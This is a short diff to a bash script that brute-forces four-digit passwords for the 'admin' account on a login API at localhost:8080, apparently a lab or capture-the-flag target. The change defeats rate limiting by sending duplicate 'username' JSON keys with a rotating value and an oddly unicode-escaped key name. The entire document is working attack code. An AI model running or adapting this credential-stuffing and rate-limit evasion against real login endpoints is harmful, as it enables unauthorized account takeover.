@@ -1,6 +1,6 @@
 #!/bin/bash
 
-echo "Brute forcing passwords from '0000' to '9999' for user 'test' with rate limit bypassing..."
+echo "Brute forcing passwords from '0000' to '9999' for user 'admin' with rate limit bypassing..."
 
 for i in {0..9999}; do
 	printf -v pwd '%04d' $i
@@ -12,7 +12,7 @@ for i in {0..9999}; do
 
 	status=$(curl localhost:8080/api/login \
 		-H "Content-Type: application/json" \
-		-d "{\"username\":\"$i\",\"username\":\"test\",\"password\":\"$pwd\"}"\
+		-d "{\"usernam\\u0071\":\"admin\",\"username\":\"$i\",\"username\":\"admin\",\"password\":\"$pwd\"}"\
 		-w "%{response_code}"\
 		-s -o /dev/null)
 
